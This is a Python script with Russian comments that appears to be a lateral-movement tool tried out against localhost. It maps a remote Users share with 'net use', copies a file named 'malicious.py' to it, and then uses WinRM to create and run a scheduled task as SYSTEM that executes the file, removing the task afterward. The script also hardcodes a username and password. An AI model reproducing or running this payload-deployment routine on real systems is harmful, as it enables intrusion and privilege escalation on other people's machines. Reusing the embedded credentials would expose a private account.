# /// script
# requires-python = ">=3.10"
# dependencies = [
#     "pywinrm",
# ]
# ///

'''
LocalAccountTokenFilterPolicy - если установлена в 0
то даже если удаленно подключается админ то ему не все
можно
'''
import subprocess
import shutil
import winrm
from pathlib import Path

def access_admin_share(computer_name, username, password, executable):
    remote = fr"\\{computer_name}\Users\0987a\Documents"
    local = "Z:"
    remotefile = Path(local + "\\") / Path(executable).name
    try:
        subprocess.run( # удаляем если уже существует
            ["net", "use", local, "/delete", "/y"],
            capture_output=True, text=True
        )
        subprocess.run(
            ["net", "use", local, remote, password, f"/USER:{username}"],
            check=True, capture_output=True, text=True
        )

        shutil.copy(executable, remotefile)
    except Exception as e:
        print("error:", e)
        
def print_err(r, label=""):
    out = r.std_out.decode('cp866', errors='ignore')
    err = r.std_err.decode('cp866', errors='ignore')
    print(f"--- {label} (rc={r.status_code}) ---")
    print(out)
    print(err)
    return r


def start_winrm_session(computer_name, username, password, command,
                        task_name="my_task", keep_task=False):
    session = winrm.Session(
        computer_name,
        auth=(username, password),
        transport='ntlm'
    )

    print_err(session.run_cmd('schtasks', ['/delete', '/tn', task_name, '/f']), 'delete')

    try:
        r = print_err(session.run_cmd('schtasks', [
            '/create', '/tn', task_name, '/tr', command,
            '/sc', 'once', '/st', '00:00', '/ru', 'SYSTEM', '/f'
        ]), 'create')
        if r.status_code != 0:
            raise RuntimeError(f"schtasks /create failed: rc={r.status_code}")

        print_err(session.run_cmd('schtasks', [
            '/query', '/tn', task_name, '/v', '/fo', 'LIST'
        ]), 'query')
        # /v - verbose, /fo - результат в виде с писка
        r = print_err(session.run_cmd('schtasks', ['/run', '/tn', task_name]), 'run')
        if r.status_code != 0:
            raise RuntimeError(f"schtasks /run failed: rc={r.status_code}")

    except Exception as e:
        print(e)

    finally:
        if not keep_task:
            print_err(session.run_cmd('schtasks', ['/delete', '/tn', task_name, '/f']), 'cleanup')

if __name__ == "__main__":
    computerName = "127.0.0.1"
    username = "0987azaaz65@gmail.com"
    password = "C0ptHgPu3Z_1234"
    path = r"C:\Users\0987a\Documents\malicious.py" # пока что захардкодили путь 
    command = r'"C:\Users\0987a\AppData\Local\Programs\Python\Python313\python.exe C:\Users\0987a\Documents\malicious.py"'

   

    script_dir = Path(__file__).resolve().parent
    mal_file = script_dir / "malicious.py"
    access_admin_share(computerName, username, password, mal_file)
   
    start_winrm_session(computerName, username, password, command)














    '''

    '''